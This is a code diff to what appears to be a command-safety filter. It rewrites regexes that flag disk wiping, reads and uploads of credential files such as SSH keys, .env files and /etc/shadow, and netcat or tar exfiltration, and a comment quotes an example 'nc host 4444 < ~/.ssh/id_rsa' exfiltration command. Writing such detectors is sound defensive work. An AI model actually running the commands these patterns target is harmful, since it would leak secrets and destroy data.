@@ -93,10 +93,18 @@ const DD_DISK_RE =
   /\bdd\b(?=[^|;&]*\bof=\/dev\/)(?=[^|;&]*\bif=\/dev\/(?:zero|urandom|random)\b)/i;
 const MKFS_RE = /\bmkfs(?:\.\w+)?\b/i;
 const READ_RE = /\b(cat|tail|head|less|more|strings|type|Get-Content)\b/i;
-const SECRET_PATH_RE =
-  /(?:\.ssh|\.aws)\b|\.env(?!\.(?:example|sample|template|dist))(?![A-Za-z0-9_.])|\.pem\b|id_rsa|(?:\.aws|aws)[/\\]credentials|\/etc\/shadow/i;
-const SECRET_UPLOAD_RE =
-  /(?:@|file=@|--upload-file[=\s]|-T\s+)[^\s]*?(?:\.ssh|\.aws|\.env(?:[^\w.]|$)|\.pem\b|id_rsa|credentials|shadow)/i;
+// .env with any real suffix (.local, .production…) is secret; only
+// example/sample/template/dist suffixes are templates. Shared with actions.ts.
+export const ENV_RE =
+  "\\.env(?:\\.(?!example\\b|sample\\b|template\\b|dist\\b)[A-Za-z0-9]+)?(?![A-Za-z0-9_.])";
+const SECRET_PATH_RE = new RegExp(
+  `(?:\\.ssh|\\.aws)\\b|${ENV_RE}|\\.pem\\b|id_rsa|\\.npmrc|(?:\\.aws|aws)[/\\\\]credentials|/etc/shadow`,
+  "i",
+);
+const SECRET_UPLOAD_RE = new RegExp(
+  `(?:@|file=@|--upload-file[=\\s]|-T\\s+)[^\\s]*?(?:\\.ssh|\\.aws|${ENV_RE}|\\.pem\\b|id_rsa|\\.npmrc|credentials|shadow)`,
+  "i",
+);
 const WRITE_RE = />|>>|\btee\b/i;
 const PERSIST_PATH_RE =
   /(\/etc\/|\/usr\/|\/var\/|\/System\/|\/Library\/Launch(?:Agents|Daemons)|\/Library\/StartupItems)/i;
@@ -115,13 +123,16 @@ const CLONE_EXEC_RE =
 const SCP_RE = /\bscp\b/i;
 const B64_RE = /\b(?:base64\s+-[a-z]*d\b|openssl\s+base64\s+-[a-z]*d\b)/i;
 // M-4: exfil without a read verb — secret material as redirect input
-// M-4: exfil without a read verb — secret material as redirect input
 // (`nc host 4444 < ~/.ssh/id_rsa`) or as a tar operand (`tar czf - ~/.ssh | …`).
 // `.env.example`-style templates are excluded, mirroring SECRET_PATH_RE.
-const SECRET_REDIRECT_RE =
-  /<\s*[^\s;&|"'<>]*?(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)[^\s;&|"'<>]*/i;
-const TAR_SECRET_RE =
-  /\btar\b[^|;&]*(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)/i;
+const SECRET_REDIRECT_RE = new RegExp(
+  `<\\s*[^\\s;&|"'<>]*?(?:\\.ssh|${ENV_RE}|id_rsa|\\.pem|credentials|shadow)[^\\s;&|"'<>]*`,
+  "i",
+);
+const TAR_SECRET_RE = new RegExp(
+  `\\btar\\b[^|;&]*(?:\\.ssh|${ENV_RE}|id_rsa|\\.pem|credentials|shadow)`,
+  "i",
+);
 // Inline eval flags: -c (python; php -c is a config path, flagged fail-safe),
 // -e (node/perl/ruby), -p (node print, php), -r (php run). Long forms
 // (--eval) and no-space forms are out of scope (residual, documented).
